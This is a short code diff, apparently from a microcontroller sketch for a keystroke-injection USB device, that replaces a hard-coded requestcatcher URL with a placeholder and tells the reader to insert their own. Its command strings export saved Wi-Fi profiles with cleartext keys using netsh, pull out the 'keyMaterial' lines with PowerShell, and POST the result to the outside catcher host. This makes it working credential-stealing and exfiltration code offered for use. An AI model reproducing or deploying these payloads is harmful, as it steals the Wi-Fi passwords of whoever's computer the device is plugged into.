@@ -23,8 +23,8 @@
 // WS2812B on PB1
 #define PIN            1
 #define NUMPIXELS      1
-//
-char powerShell[] = "powershell Invoke-WebRequest -Uri https://snake.requestcatcher.com/ -Me POST -I Wi-";
+// insert your own requestcatcher site
+char powerShell[] = "powershell Invoke-WebRequest -Uri https://xxxxx.requestcatcher.com/ -Me POST -I Wi-";
 char command1[] = "cd %temp% && netsh wlan export profile key=clear && powershell Select-String -Path Wi*.xml -Patt 'keyMaterial' > Wi-";
 //
 Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_RGB + NEO_KHZ800);
